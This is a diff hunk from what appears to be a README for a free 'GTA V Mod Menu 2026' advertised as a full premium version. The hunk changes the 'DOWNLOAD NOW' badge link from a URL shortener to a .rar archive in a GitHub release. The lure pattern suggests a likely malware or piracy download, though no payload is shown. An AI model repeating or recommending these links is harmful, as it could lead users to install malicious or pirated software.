@@ -93,7 +93,7 @@ Yes — full premium version with no trial limitations or hidden fees.
 |---|---|---|
 | v2026 | [![Working](https://img.shields.io/badge/Working-brightgreen)](https://flyn.co/17yeN7) | 4.7m+ |
 
-[![Download Now](https://img.shields.io/badge/DOWNLOAD%20NOW-v2026-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://flyn.co/17yeN7)
+[![Download Now](https://img.shields.io/badge/DOWNLOAD%20NOW-v2026-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/eric-lio1902e8/GTA-V-Mod-Menu-2026/releases/download/Gta-5/GTA-V-Mod-Menu-Works-Online-main.rar)
 
 ---
 
